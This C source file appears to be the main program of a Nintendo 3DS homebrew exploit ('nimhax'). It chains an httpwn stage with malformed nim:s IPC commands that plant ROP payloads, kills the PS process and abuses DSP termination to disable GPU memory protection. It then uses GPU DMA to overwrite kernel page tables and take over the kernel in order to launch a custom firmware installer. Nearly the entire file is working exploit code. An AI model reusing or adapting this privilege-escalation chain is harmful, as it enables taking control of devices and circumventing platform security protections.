#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <3ds.h>

#include <common_errors.h>

//#include <utils/crypto.h>
#include <utils/fileio.h>

#include "../kernelhaxcode_3ds/takeover.h"
#include "kernelhaxcode_3ds_bin.h"

#ifndef DEFAULT_PAYLOAD_FILE_OFFSET
#define DEFAULT_PAYLOAD_FILE_OFFSET 0
#endif
#ifndef DEFAULT_PAYLOAD_FILE_NAME
#define DEFAULT_PAYLOAD_FILE_NAME   "SafeB9SInstaller.bin"
#endif

#define PSTID 0x0004013000003102ULL
#define DSPTID 0x0004013000001A02ULL
#define NIMTID 0x0004013000002C02ULL
#define HTTPTID 0x0004013000002902ULL

static inline void dbg(void)
{
	u32 gpuprot = *(vu32 *)0x90140140;
	printf("[INFO] GPUPROT = %08lx\n", gpuprot);
}

static inline void __flush_prefetch_buffer(void)
{
    // Similar to isb in newer Arm architecture versions
    __asm__ __volatile__ ("mcr p15, 0, %0, c7, c5, 4" :: "r" (0) : "memory");
}

// Source: https://github.com/smealum/udsploit/blob/master/source/kernel.c#L11
static void gspSetTextureCopyPhys(u32 outPa, u32 inPa, u32 size, u32 inDim, u32 outDim, u32 flags)
{
	// Ignore results... only reason it would be invalid is if the handle itself is invalid
	const u32 enableBit = 1;

	GSPGPU_WriteHWRegs(0x1EF00C00 - 0x1EB00000, (u32[]){inPa >> 3, outPa >> 3}, 0x8);
	GSPGPU_WriteHWRegs(0x1EF00C20 - 0x1EB00000, (u32[]){size, inDim, outDim}, 0xC);
	GSPGPU_WriteHWRegs(0x1EF00C10 - 0x1EB00000, &flags, 4);
	GSPGPU_WriteHWRegsWithMask(0x1EF00C18 - 0x1EB00000, &enableBit, 4, &enableBit, 4);

	svcSleepThread(25 * 1000 * 1000LL); // should be enough
}

static inline void gspwn(u32 outPa, u32 inPa, u32 size)
{
	gspSetTextureCopyPhys(outPa, inPa, size, 0, 0, 8);
}

static inline void gspDoFullCleanInvCacheTrick(void)
{
	// Ignore results, this shall always succeed, unless the handle is invalid

	// Trigger full DCache + L2C clean&inv using this cute little trick (just need to pass a size value higher than the cache size)
	// (but not too high; dcache+l2c size on n3ds is 0x700000; and any non-null userland addr gsp accepts)
	GSPGPU_FlushDataCache((const void *)0x14000000, 0x700000);
}

static void mapL2TableViaGpuDma(const BlobLayout *layout, void *workBuffer)
{
	static const u32 s_l1tables[] = { 0x1FFF8000, 0x1FFFC000, 0x1F3F8000, 0x1F3FC000 };
	u32 numCores = IS_N3DS ? 4 : 2;

	// Minimum size of GPU DMA is 16, so we need to pad a bit...
	u32 l1EntryData[4] = { osConvertVirtToPhys(layout->l2table) | 1 };
	memcpy(workBuffer, l1EntryData, 16);
	__dsb();

	// Ignore result
	GSPGPU_FlushDataCache(workBuffer, 16);

	u32 l1EntryPa = osConvertVirtToPhys(workBuffer);

	for (u32 i = 0; i < numCores; i++) {
		u32 dstPa = s_l1tables[i] + (KHC3DS_MAP_ADDR >> 20) * 4;
		gspwn(dstPa, l1EntryPa, 16);
	}

	// No need to clean&invalidate here:
	// https://developer.arm.com/docs/ddi0360/e/memory-management-unit/hardware-page-table-translation
	// "MPCore hardware page table walks do not cause a read from the level one Unified/Data Cache"

	__dsb();
	__flush_prefetch_buffer();
}

static Result takeOverKernelAndBeyond(const char *payloadFileName, size_t payloadFileOffset)
{
	__dsb();
	BlobLayout *layout = (BlobLayout *)linearMemAlign(sizeof(BlobLayout), 0x1000);
	if (layout == NULL)
		return -1;
	
	memset(layout, 0, sizeof(BlobLayout));
	memcpy(layout->code, kernelhaxcode_3ds_bin, kernelhaxcode_3ds_bin_size);
	khc3dsPrepareL2Table(layout);
	// Ensure everything (esp. the layout) is written back into the main memory
	GSPGPU_FlushDataCache((const void *)0x14000000, 0x700000);
	__dsb();
	__flush_prefetch_buffer();

	mapL2TableViaGpuDma(layout, layout->smallWorkBuffer);

	khc3dsLcdDebug(true, 128, 64, 0); // brown
	return khc3dsTakeover(payloadFileName, payloadFileOffset);
}

Result initialize_ctr_httpwn(const char* serverconfig_localpath);

static Handle nimsHandle = 0;
static int nimsRefCount = 0;

static Result _nimsInit() {
	Result res;
	if (AtomicPostIncrement(&nimsRefCount)) return 0;
	res = srvGetServiceHandle(&nimsHandle, "nim:s");
	if (R_FAILED(res)) AtomicDecrement(&nimsRefCount);

	return res;
}

static void _nimsExit(void) {
	if (AtomicDecrement(&nimsRefCount)) return;
	svcCloseHandle(nimsHandle);
}

extern const u32 NIMS_0x5E_IPC_PwnedReplyBase[];
extern const u32 NIMS_0x5E_IPC_PwnedReplyBase_size;

extern const u32 NIMS_0x5E_StackRecoveryPivot[];
extern const u32 NIMS_0x5E_StackRecoveryPivot_size;

extern const u32 NIMS_0x5E_ROP_STAGE2_Part1[];
extern const u32 NIMS_0x5E_ROP_STAGE2_Part1_size;

extern const u32 NIMS_0x5E_ROP_STAGE2_Part2[];
extern const u32 NIMS_0x5E_ROP_STAGE2_Part2_size;

extern const u32 NIMS_0x5E_ROP_TakeOver[];
extern const u32 NIMS_0x5E_ROP_TakeOver_size;

Result NIMS_PWNCMD0x5EPart1(bool* haxran) {
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x5e, 0, 6); // normally, it should be 0x005e0000, but there's no checks in argumentless cmds, so we'll abuse this to shove a ROP into staticbufs for second stage after httpwn causes stage 1 to run
	cmdbuf[1] = IPC_Desc_StaticBuffer(NIMS_0x5E_ROP_STAGE2_Part1_size, 2); // max 0x1000
	cmdbuf[2] = (u32)NIMS_0x5E_ROP_STAGE2_Part1;
	cmdbuf[3] = IPC_Desc_StaticBuffer(NIMS_0x5E_IPC_PwnedReplyBase_size, 0); // max 0x40
	cmdbuf[4] = (u32)NIMS_0x5E_IPC_PwnedReplyBase;
	cmdbuf[5] = IPC_Desc_StaticBuffer(NIMS_0x5E_StackRecoveryPivot_size, 1); // max 0x400
	cmdbuf[6] = (u32)NIMS_0x5E_StackRecoveryPivot;

	if (R_FAILED(ret = svcSendSyncRequest(nimsHandle))) return ret;

	if (cmdbuf[0] != IPC_MakeHeader(0x5e, 2, 0)) {
		if (haxran) *haxran = false;
		return (Result)cmdbuf[1];
	}

	if (haxran) *haxran = cmdbuf[2];

	return (Result)cmdbuf[1];
}

Result NIMS_PWNCMD0x5EPart2(bool* haxran) {
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x5e, 0, 4);
	cmdbuf[1] = IPC_Desc_StaticBuffer(NIMS_0x5E_ROP_STAGE2_Part2_size, 2); // max 0x1000
	cmdbuf[2] = (u32)NIMS_0x5E_ROP_STAGE2_Part2;
	cmdbuf[3] = IPC_Desc_StaticBuffer(NIMS_0x5E_ROP_TakeOver_size, 0); // patched static buf
	cmdbuf[4] = (u32)NIMS_0x5E_ROP_TakeOver;

	if (R_FAILED(ret = svcSendSyncRequest(nimsHandle))) return ret;

	if (cmdbuf[0] != IPC_MakeHeader(0x5e, 2, 0)) {
		if (haxran) *haxran = false;
	} else if (haxran) *haxran = true;

	return (Result)cmdbuf[1];
}

Result NIMS_Custom0x1001(bool* haxran) {
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x1001, 0, 0);

	if (R_FAILED(ret = svcSendSyncRequest(nimsHandle))) return ret;

	if (cmdbuf[0] != IPC_MakeHeader(0x1001, 1, 0)) {
		if (haxran) *haxran = false;
	} else if (haxran) *haxran = true;

	return (Result)cmdbuf[1];
}

#define TRY(expr) if(R_FAILED(res = (expr))) return res;

static Result dspTakeoverClientAction(void)
{
	// The end goal is to write 0 to CFG11_GPUPROT to make the GPU be able to write to kernel memory.
	Result res = 0;
	bool isLoaded;

	TRY(dspInit());

	static u16 fakeDspFirmware[0x180] = {0}; // lenny

	res = DSP_LoadComponent(fakeDspFirmware, sizeof(fakeDspFirmware), 0xFF, 0xFF, &isLoaded);

	dspExit();

	TRY(NS_TerminateProcessTID(DSPTID, -1LL)); // send termination notification (0x100) to DSP & trigger the holy ROP
	svcSleepThread(100 * 1000 * 1000LL); // wait for DSP to cleanup and execute rop

	return res;
}

Result funWithNim() {
	Result ret;
	bool haxran;

	ret = _nimsInit();
	if (R_FAILED(ret)) {
		printf("Failed to init nim:s. 0x%08lx\n", ret);
		return ret;
	}

	ret = nsInit();
	if (R_FAILED(ret)) {
		printf("Failed to init ns. 0x%08lx\n", ret);
		_nimsExit();
		return ret;
	}

	ret = NIMS_PWNCMD0x5EPart1(&haxran);
	printf("nims_0x5E part1 0x%08lx\n", ret);
	if (!haxran) {
		printf("nims_0x5E pwn did not run.\n");
		nsExit();
		_nimsExit();
		return MAKERESULT(RL_PERMANENT, RS_INVALIDSTATE, RM_APPLICATION, RD_NOT_INITIALIZED);
	}
	ret = NIMS_PWNCMD0x5EPart2(&haxran);
	printf("nims_0x5E part2 0x%08lx\n", ret);
	if (!haxran) {
		printf("nims_0x5E pwn did not run.\n");
		nsExit();
		_nimsExit();
		return MAKERESULT(RL_PERMANENT, RS_INVALIDSTATE, RM_APPLICATION, RD_NOT_INITIALIZED);
	}

	// 1) Kill PS immediately
	ret = NS_TerminateProcessTID(PSTID, 0);
	if (R_FAILED(ret))
	{
		printf("Failed to terminate PS\n");
		nsExit();
		_nimsExit();
		return ret;
	}

	svcSleepThread(250 * 1000 * 1000LL); // wait for pm to ask srv to cleanup

	// 2) Tell custom service to get ready for fake ps:ps service
	ret = NIMS_Custom0x1001(&haxran);
	printf("nims custom 0x1001 0x%08lx\n", ret);
	if (!haxran) {
		printf("nims custom command did not run.\n");
		nsExit();
		_nimsExit();
		return MAKERESULT(RL_PERMANENT, RS_INVALIDSTATE, RM_APPLICATION, RD_NOT_INITIALIZED);
	}

	svcSleepThread(100 * 1000 * 1000LL);

	// 3) profit
	ret = dspTakeoverClientAction();
	if (R_FAILED(ret))
		printf("DSP takeover (client part) failed: %08lx\n", ret);

	//dbg();

	nsExit();
	_nimsExit();
	return ret;
}
// ---------------------------------------

static Result check_module_versions(u16* versions) {
	Result ret = amInit();
	if(R_FAILED(ret))
		return ret;

	u64 tid[3] = {NIMTID, HTTPTID, DSPTID};
	AM_TitleEntry title_entry[3];

	ret = AM_GetTitleInfo(MEDIATYPE_NAND, 3, &tid[0], &title_entry[0]);

	if(R_SUCCEEDED(ret)) {
		if (title_entry[0].version != 14341) ret = RES_INVALID_VALUE;
		else if (title_entry[1].version != 14336) ret = RES_INVALID_VALUE;
		else if (title_entry[2].version != 7169) ret = RES_INVALID_VALUE;
		else ret = 0;
		versions[0] = title_entry[0].version;
		versions[1] = title_entry[1].version;
		versions[2] = title_entry[2].version;
	}

	amExit();
	return ret;
}

// ---------------------------------------
// because there was no function to get current cfg handle
// copied some functions from ctrulib and added a new

static Handle cfgHandle;
static int cfgRefCount;

static Result _cfgInit(void)
{
	Result ret;

	if (AtomicPostIncrement(&cfgRefCount)) return 0;

	// cfg:i has the most commands, then cfg:s, then cfg:u
	ret = srvGetServiceHandle(&cfgHandle, "cfg:i");
	if(R_FAILED(ret)) ret = srvGetServiceHandle(&cfgHandle, "cfg:s");
	//if(R_FAILED(ret)) ret = srvGetServiceHandle(&cfguHandle, "cfg:u"); // not useful here
	if(R_FAILED(ret)) AtomicDecrement(&cfgRefCount);

	return ret;
}

static void _cfgExit(void)
{
	if (AtomicDecrement(&cfgRefCount)) return;
	svcCloseHandle(cfgHandle);
}

static Result _CFG_GetConfigInfoBlk4(u32 size, u32 blkID, volatile void* outData)
{
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x401,2,2); // 0x4010082
	cmdbuf[1] = size;
	cmdbuf[2] = blkID;
	cmdbuf[3] = IPC_Desc_Buffer(size,IPC_BUFFER_W);
	cmdbuf[4] = (u32)outData;

	if(R_FAILED(ret = svcSendSyncRequest(cfgHandle)))return ret;

	return (Result)cmdbuf[1];
}

static Result _CFG_SetConfigInfoBlk4(u32 size, u32 blkID, volatile const void* inData)
{
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x402,2,2); // 0x4020082
	cmdbuf[1] = blkID;
	cmdbuf[2] = size;
	cmdbuf[3] = IPC_Desc_Buffer(size,IPC_BUFFER_R);
	cmdbuf[4] = (u32)inData;

	if(R_FAILED(ret = svcSendSyncRequest(cfgHandle)))return ret;

	return (Result)cmdbuf[1];
}

static Result _CFGI_CreateConfigInfoBlk(u32 size, u32 blkID, u16 blkFlags, const void* inData)
{
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x804,3,2); // 0x80400C2
	cmdbuf[1] = blkID;
	cmdbuf[2] = size;
	cmdbuf[3] = blkFlags;
	cmdbuf[4] = IPC_Desc_Buffer(size,IPC_BUFFER_R);
	cmdbuf[5] = (u32)inData;

	if(R_FAILED(ret = svcSendSyncRequest(cfgHandle)))return ret;

	return (Result)cmdbuf[1];
}

#define CFG_BLKID_NOT_FOUND MAKERESULT(RL_PERMANENT, RS_WRONGARG, RM_CONFIG, RD_NOT_FOUND)

static Result try_ensure_npns() {
	Result ret = _cfgInit();
	if (R_FAILED(ret)) {
		printf("Failed to init cfg. Assuming NPNS is set.\n");
		printf("Will fail if this not set!!\n");
		printf("Open eShop if exploit fails if able without updating.\n");
		return 0;
	}

	static const char expected_npns_server_selector[4] = {'L', '1', 0, 0};
	static const char dummy_npns_token[0x28] = {'A', 0};
	volatile char npns_server_selector[4] = {0};
	volatile char npns_token[0x28] = {0};

	ret = _CFG_GetConfigInfoBlk4(4, 0x150002, &npns_server_selector);
	if (ret == CFG_BLKID_NOT_FOUND) {
		ret = _CFGI_CreateConfigInfoBlk(4, 0x150002, 0xE, expected_npns_server_selector);
		npns_server_selector[0] = 'L';
	}

	if (R_SUCCEEDED(ret)) ret = _CFG_GetConfigInfoBlk4(0x28, 0xF0006, &npns_token);

	if (ret == CFG_BLKID_NOT_FOUND) {
		ret = _CFGI_CreateConfigInfoBlk(0x28, 0xF0006, 0xC, dummy_npns_token);
		npns_token[0] = 'A';
	}

	if (R_FAILED(ret)) {
		printf("Cannot guarantee NPNS is set!!\n");
		printf("Will fail if this not set!!\n");
		printf("Open eShop if pwn fails if able without updating.\n");
		return 0; // we'll try as well and hope
	}

	if (npns_token[0] == 0) {
		printf("Invalid NPNS Token, fixing...\n");
		ret = _CFG_SetConfigInfoBlk4(0x28, 0xF0006, dummy_npns_token);
	}

	if (R_SUCCEEDED(ret) && npns_server_selector[0] != 'l' && npns_server_selector[0] != 'L') {
		printf("Invalid NPNS Server selector, fixing...\n");
		ret = _CFG_SetConfigInfoBlk4(4, 0x150002, expected_npns_server_selector);
	}

	_cfgExit();
	return ret;
}

// ---------------------------------------

int main(int argc, char **argv)
{
	char *serverconfig_localpath = "nim_config.xml";
	Result ret = 0;

	gfxInitDefault();

	PrintConsole topScreen, bottomScreen;

	consoleInit(GFX_TOP, &topScreen);
	consoleInit(GFX_BOTTOM, &bottomScreen);

	consoleSelect(&bottomScreen);

	printf("nimhax with ctr-httpwn\n");
	printf("dsp pwning with nimhax\n\n");

	u16 versions[3] = {0};

	ret = check_module_versions(&versions[0]);

	if (ret == RES_INVALID_VALUE) {
		if (versions[0] != 14341) printf("Expected NIM v14341, got v%i\n", versions[0]);
		if (versions[1] != 14336) printf("Expected HTTP v14336, got v%i\n", versions[1]);
		if (versions[2] != 7169)  printf("Expected DSP v7169, got v%i\n", versions[2]);
	}

	if (R_SUCCEEDED(ret)) {
		printf("Trying to ensure npns tokens...\n");
		ret = try_ensure_npns();

		if (R_FAILED(ret)) {
			printf("NPNS is invalid but we failed to fix it!!\n");
			printf("res = 0x%08lx\n", ret);
		}
	}

	gfxFlushBuffers();
	gfxSwapBuffers();
	gspWaitForVBlank();

	if (R_SUCCEEDED(ret)) {
		consoleSelect(&topScreen);

		ret = initialize_ctr_httpwn(serverconfig_localpath);

		gfxFlushBuffers();
		gfxSwapBuffers();
		gspWaitForVBlank();

		consoleSelect(&bottomScreen);

		printf("Initialized res = 0x%08lx\n", ret);
	}

	if (R_SUCCEEDED(ret)) ret = funWithNim();

	if (R_SUCCEEDED(ret)) {
		ret = takeOverKernelAndBeyond(DEFAULT_PAYLOAD_FILE_NAME, DEFAULT_PAYLOAD_FILE_OFFSET);
		printf("Taking over kernel: 0x%08lX\n", ret);
	}

	if (R_SUCCEEDED(ret)) printf("Done.\n");
	else {
		if (ret == RES_APT_CANCELED)
			{/* ignore */}
		else if (ret == RES_USER_CANCELED)
			printf("User Canceled.\n");
		else printf("Failed.\n");
	}

	if (ret != RES_APT_CANCELED) {

		printf("\nPress the START button to exit.\n");
		while (aptMainLoop())
		{
			gfxFlushBuffers();
			gfxSwapBuffers();
			gspWaitForVBlank();

			hidScanInput();

			u32 kDown = hidKeysDown();
			if (kDown & KEY_START)
				break; // break in order to return to hbmenu
		}
	}

	gfxExit();
	return 0;
}
